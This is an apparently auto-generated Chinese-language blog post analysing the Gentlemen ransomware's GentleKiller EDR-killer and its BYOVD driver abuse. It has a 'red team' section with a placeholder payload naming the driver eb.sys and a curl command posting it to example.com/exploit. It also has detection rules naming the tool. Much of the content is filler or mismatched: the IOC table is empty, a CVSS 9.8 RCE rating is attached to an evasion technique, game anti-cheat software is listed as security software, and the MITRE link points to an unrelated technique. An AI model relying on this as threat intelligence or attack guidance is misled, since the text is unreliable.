---
layout: post
title:  "The Gentlemen RaaS Uses GentleKiller EDR Framework Targeting 400 Security Processes"
date:   2026-06-19 19:30:02 +0000
categories: [security]
severity: critical
---

# 🚨 解析 The Gentlemen Ransomware 的 EDR 繞過技術

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: BYOVD (Bring Your Own Vulnerable Driver), EDR 繞過, Secure Boot bypass

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: The Gentlemen Ransomware 的 EDR 繞過技術是基於 BYOVD 攻擊技術，利用第三方或泄露的工具（如 HexKiller, ThrottleBlood, HavocKiller）來繞過系統防禦。這些工具通過標準化的防禦繞過層，偽裝成安全軟件，使用假版本信息，複製合法證書和圖標。
* **攻擊流程圖解**:
  1. 攻擊者獲得系統訪問權限
  2. 攻擊者下載和安裝 EDR 繞過工具（如 GentleKiller）
  3. EDR 繞過工具啟動，偵測和終止系統防禦軟件
  4. 攻擊者部署加密軟件，開始加密系統文件
* **受影響元件**: Windows 系統，多種安全軟件（如 Kaspersky, FACEIT Anti-Cheat, Valorant）

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 系統訪問權限，網路位置
* **Payload 建構邏輯**:

    ```
    
    python
      # 示例 Payload 結構
      payload = {
        "driver_name": "eb.sys",
        "driver_path": "C:\\Windows\\System32\\drivers\\eb.sys",
        "exploit_code": "..."
      }
    
    ```
 

```

bash
  # 示例指令
  curl -X POST -H "Content-Type: application/json" -d '{"driver_name": "eb.sys", "driver_path": "C:\\Windows\\System32\\drivers\\eb.sys", "exploit_code": "..."}' http://example.com/exploit

```
* **繞過技術**: EDR 繞過工具使用標準化的防禦繞過層，偽裝成安全軟件，使用假版本信息，複製合法證書和圖標。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| ... | ... | ... | ... |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule GentleKiller {
        meta:
          description = "GentleKiller EDR 繞過工具"
          author = "..."
        strings:
          $a = "GentleKiller"
          $b = "eb.sys"
        condition:
          $a and $b
      }
    
    ```
 

```

snort
  alert tcp any any -> any any (msg:"GentleKiller EDR 繞過工具"; content:"GentleKiller"; content:"eb.sys";)

```
* **緩解措施**: 更新系統和安全軟件，啟用 Secure Boot，使用 UEFI Forbidden Signature Database (DBX) 來防止可疑應用程序執行。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **BYOVD (Bring Your Own Vulnerable Driver)**: 一種攻擊技術，利用第三方或泄露的驅動程序來繞過系統防禦。
* **EDR (Endpoint Detection and Response)**: 一種安全軟件，用于偵測和響應端點安全事件。
* **Secure Boot**: 一種安全機制，用于防止可疑應用程序執行。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/the-gentlemen-raas-uses-gentlekiller.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1547/)


